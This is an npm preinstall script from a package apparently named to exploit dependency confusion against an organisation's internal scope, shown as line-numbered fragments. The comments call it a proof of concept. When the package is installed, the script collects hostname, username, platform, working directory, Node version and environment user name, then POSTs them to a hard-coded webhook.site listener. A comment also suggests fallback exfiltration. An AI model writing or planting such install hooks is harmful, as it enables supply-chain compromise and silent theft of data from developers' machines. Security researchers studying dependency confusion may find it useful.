// File: tmp/tmp32iizofy/@abb-ux-commonux-web-components/package/preinstall-script.js
// ======================================================================
Line 2: const os = require('os')
Line 3: const https = require('https')
Line 4: const process = require('process')
Line 8: {
    const data = {
        message: "Dependency Confusion PoC Triggered!",
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        username: os.userInfo().username,
        platform: os.platform(),
        arch: os.arch(),
        cwd: process.cwd(),
        nodeVersion: process.version,
        envUser: process.env.USER || process.env.USERNAME, // Common user env var
        // Add any other non-sensitive info you want to collect
    };

    const payload = JSON.stringify(data);

    // **IMPORTANT**: Replace with YOUR Webhook.site URL or other listener
    const webhookUrl = 'https://webhook.site/c4d98953-a6e6-49f7-9bc8-acf992486460'; // e.g., 'https://webhook.site/your-unique-id'
    
    const urlParts = new URL(webhookUrl);

    const options = {
        hostname: urlParts.hostname,
        path: urlParts.pathname + urlParts.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'...
Line 12: os.hostname()
Line 13: os.userInfo()
Line 14: os.platform()
Line 15: os.arch()
Line 25: const webhookUrl = 'https://webhook.site/c4d98953-a6e6-49f7-9bc8-acf992486460'
Line 39: const req = https.request(options, (res) => {
        console.log(`[+] POC data sent. Status: ${res.statusCode}`);
        res.on('data', (d) => {
            // process.stdout.write(d); // Optional: log response from webhook server
        });
    })
Line 40: console.log(`[+] POC data sent. Status: ${res.statusCode}`)
Line 46: {
        console.error('[-] Error sending POC data:', error.message);
    }
Line 47: console.error('[-] Error sending POC data:', error.message)
Line 50: req.write(payload)
Line 51: req.end()
Line 53: console.log('[+] Attempted to send data to webhook.')
Line 55: catch (e) {
    console.error('[-] Error in preinstall script:', e.message);
    // Optionally, try a simpler fallback exfiltration if the above fails, e.g., DNS
    // const fs = require('fs');
    // fs.writeFileSync('poc_triggered.txt', `Hostname: ${os.hostname()}, User: ${os.userInfo().username}`);
    // console.log('[+] Wrote to poc_triggered.txt as fallback (if this runs on target).');
}
Line 56: console.error('[-] Error in preinstall script:', e.message)
